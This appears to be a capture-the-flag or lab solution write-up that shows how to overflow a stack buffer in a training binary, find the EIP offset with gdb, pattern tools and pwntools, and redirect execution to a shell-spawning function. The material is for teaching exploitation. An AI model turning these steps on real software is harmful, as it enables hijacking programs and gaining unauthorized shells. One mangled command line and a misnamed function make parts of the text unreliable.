## Overview

`override.solution.md` shows that we can overflow the stack to overwrite
local variables within a function. We can keep writing arbitrary data
until we eventually hit the EIP (Extended Instruction Pointer),
which points to the next instruction that will be executed.

### Determining EIP values

We can see the available functions with gdb:

```
info functions

All defined functions:

File secure_shell.c:
11:     void login();
26:     int main(int, char **);
5:      void open_shell();

Non-debugging symbols:
0x08049000  _init
0x080490a0  setgid@plt
0x080490b0  puts@plt
... etc ...
```

Jumping directly to the `login_shell` function would be perfect.
Let's get the memory address location:

```
pwndbg> p open_shell
$4 = {void ()} 0x8049216 <open_shell>
```

If we can write the value of 0x8049216 converted to little endian to
the EIP, then function called after `login` exits will be the `open_shell`
function.

We can hard code the value of `0x8049216` as the EIP value, as the binary
isn't compiled with the Position Independent Executable (PIE) flag set:

```
checksec secure_shell
[*] '/home/user/app/secure_shell'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Otherwise, the memory address of `open_shell` would be different each time
the program is run.

### Calculating required buffer size

We can create an arbitrary length value:

```
ruby  ./tools/exploit/pattern_create.rb -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```

Open gdb, paste the value in, and when it crashes see the value
of EIP:

```
pwndbg> run
Starting program: /home/user/app/secure_shell
warning: Error disabling address space randomization: Operation not permitted
Please enter secure shell password:
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Access denied

Program received signal SIGSEGV, Segmentation fault.
... etc ...

pwndbg> info registers
eax            0xe                 14
ecx            0xffffffff          -1
edx            0xffffffff          -1
ebx            0x62413362          1648440162
esp            0xffe3d760          0xffe3d760
ebp            0x35624134          0x35624134
esi            0xf7fbe000          -134488064
edi            0xf7fbe000          -134488064
eip            0x41366241          0x41366241
eflags         0x10282             [ SF IF RF ]
cs             0x23                35
ss             0x2b                43
ds             0x2b                43
es             0x2b                43
fs             0x0                 0
gs             0x63                99
pwndbg> p $eip
$10 = (void (*)()) 0x41366241
```

Note that the EIP value is `0x41366241`, to find the required buffer size:
```
ruby  ./tools/exploit/pattern_offset.rb -l 100 -[*] Exact match at offset 48
```

We will need to write 48 bytes before writing the EIP value

### Final Solution

Verify the payload works as expected:

```
python3 ./control_eip.py | xxd
```

Remember to keep stdin open:

```
(python3 control_eip.py; echo ''; cat) | ./secure_shell
```

Also see `control_eip_pwntools.py` for a solution which uses pwntools:

```
gdb ./secure_shell
pwndbg> run < <(cyclic 100)
[ crash ]

pwndbg> p $eip
$1 = (void (*)()) 0x6161616d
pwndbg> cyclic -l 0x6161616d
48
```

Running:
```
(python3 control_eip_pwntools.py; echo ''; cat) | ./secure_shell
```
